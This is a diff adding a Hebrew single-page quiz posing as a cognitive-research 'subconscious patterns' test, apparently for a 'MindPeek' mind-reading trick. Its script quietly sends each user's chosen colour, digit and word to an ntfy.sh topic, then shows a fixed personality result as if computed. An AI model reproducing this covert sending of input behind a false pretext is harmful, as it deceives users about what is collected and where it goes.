@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>מבדק דפוסי תת-מודע</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #0f172a;
+      color: #f8fafc;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+    .quiz-card {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 16px;
+      padding: 28px 20px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.4);
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .header h2 {
+      font-size: 1.35rem;
+      font-weight: 600;
+      color: #38bdf8;
+      margin-bottom: 6px;
+    }
+    .header p {
+      font-size: 0.85rem;
+      color: #94a3b8;
+    }
+    .step-section {
+      margin-bottom: 22px;
+    }
+    .step-label {
+      font-size: 0.95rem;
+      margin-bottom: 10px;
+      display: block;
+      color: #e2e8f0;
+      font-weight: 500;
+    }
+    .color-group {
+      display: flex;
+      gap: 10px;
+      justify-content: space-between;
+    }
+    .color-btn {
+      flex: 1;
+      height: 42px;
+      border-radius: 8px;
+      border: 2px solid transparent;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+      font-weight: bold;
+      color: white;
+    }
+    .color-btn.selected {
+      border-color: #ffffff;
+      transform: scale(0.96);
+    }
+    .c-red { background: #ef4444; }
+    .c-blue { background: #3b82f6; }
+    .c-green { background: #10b981; }
+    .c-yellow { background: #f59e0b; color: #000; }
+
+    .number-grid {
+      display: grid;
+      grid-template-columns: repeat(9, 1fr);
+      gap: 5px;
+    }
+    .num-btn {
+      height: 38px;
+      background: #334155;
+      border: 1px solid #475569;
+      color: white;
+      border-radius: 6px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .num-btn.selected {
+      background: #38bdf8;
+      color: #0f172a;
+      border-color: #38bdf8;
+    }
+
+    .text-input {
+      width: 100%;
+      height: 46px;
+      background: #0f172a;
+      border: 1px solid #475569;
+      border-radius: 8px;
+      color: #f8fafc;
+      padding: 0 14px;
+      font-size: 1rem;
+      outline: none;
+      direction: rtl;
+    }
+    .text-input:focus {
+      border-color: #38bdf8;
+    }
+
+    .submit-btn {
+      width: 100%;
+      height: 48px;
+      background: #38bdf8;
+      color: #0f172a;
+      font-size: 1.05rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .submit-btn:active {
+      transform: scale(0.98);
+    }
+
+    #result-screen {
+      display: none;
+      text-align: center;
+      padding: 20px 0;
+    }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #334155;
+      border-top: 4px solid #38bdf8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .result-title {
+      font-size: 1.25rem;
+      color: #38bdf8;
+      margin-bottom: 12px;
+      font-weight: bold;
+    }
+    .result-text {
+      font-size: 0.95rem;
+      color: #cbd5e1;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="quiz-card" id="quiz-container">
+    <div class="header">
+      <h2>מבדק דפוסי תת-מודע</h2>
+      <p>מעבדת מחקר קוגניטיבית • גרסה 2.4</p>
+    </div>
+
+    <!-- שלב 1: צבע -->
+    <div class="step-section">
+      <span class="step-label">1. בחר צבע שמושך אותך כעת אינטואיטיבית:</span>
+      <div class="color-group">
+        <div class="color-btn c-red" onclick="selectColor('אדום', this)">אדום</div>
+        <div class="color-btn c-blue" onclick="selectColor('כחול', this)">כחול</div>
+        <div class="color-btn c-green" onclick="selectColor('ירוק', this)">ירוק</div>
+        <div class="color-btn c-yellow" onclick="selectColor('צהוב', this)">צהוב</div>
+      </div>
+    </div>
+
+    <!-- שלב 2: מספר -->
+    <div class="step-section">
+      <span class="step-label">2. בחר ספרה ראשונה שקופצת לך לראש:</span>
+      <div class="number-grid" id="numbers-container"></div>
+    </div>
+
+    <!-- שלב 3: מילה -->
+    <div class="step-section">
+      <span class="step-label">3. מילה/חפץ שמסמל עבורך חופש או זיכרון ילדות:</span>
+      <input type="text" id="free-word" class="text-input" placeholder="למשל: ים, אופניים, קיץ..." autocomplete="off">
+    </div>
+
+    <button class="submit-btn" onclick="submitAnalysis()">עיבוד וניתוח נתונים</button>
+  </div>
+
+  <div class="quiz-card" id="result-screen">
+    <div class="spinner" id="loader"></div>
+    <div id="final-analysis" style="display: none;">
+      <div class="result-title">פרופיל אישיות: אינטואיטיבי-רגשי</div>
+      <p class="result-text">
+        הבחירות שלך מעידות על חשיבה אסוציאטיבית חדה ונטייה להסתמך על תחושות בטן עמוקות. יש לך יכולת גבוהה לזהות דפוסים סביבך עוד לפני שהם מתרחשים.
+      </p>
+    </div>
+  </div>
+
+  <script>
+    const NTFY_TOPIC = "magic-peek-889";
+
+    let chosenColor = "לא נבחר";
+    let chosenNumber = "לא נבחר";
+
+    const numGrid = document.getElementById("numbers-container");
+    for (let i = 1; i <= 9; i++) {
+      const btn = document.createElement("button");
+      btn.className = "num-btn";
+      btn.textContent = i;
+      btn.type = "button";
+      btn.onclick = function() {
+        document.querySelectorAll(".num-btn").forEach(b => b.classList.remove("selected"));
+        this.classList.add("selected");
+        chosenNumber = i;
+      };
+      numGrid.appendChild(btn);
+    }
+
+    function selectColor(color, el) {
+      document.querySelectorAll(".color-btn").forEach(b => b.classList.remove("selected"));
+      el.classList.add("selected");
+      chosenColor = color;
+    }
+
+    function submitAnalysis() {
+      const word = document.getElementById("free-word").value.trim() || "ללא מילה";
+      const messageText = `צבע: ${chosenColor} | מספר: ${chosenNumber} | מילה: ${word}`;
+
+      // שליחה באמצעות פורמט JSON של ntfy - מאפשר עברית חופשית בלי בעיות כותרות
+      fetch("https://ntfy.sh", {
+        method: "POST",
+        body: JSON.stringify({
+          topic: NTFY_TOPIC,
+          message: messageText,
+          title: "MindPeek",
+          priority: 4
+        })
+      }).catch(err => console.error("Error:", err));
+
+      // מעבר מסך מיידי
+      document.getElementById("quiz-container").style.display = "none";
+      document.getElementById("result-screen").style.display = "block";
+
+      setTimeout(() => {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("final-analysis").style.display = "block";
+      }, 1200);
+    }
+  </script>
+</body>
+</html>
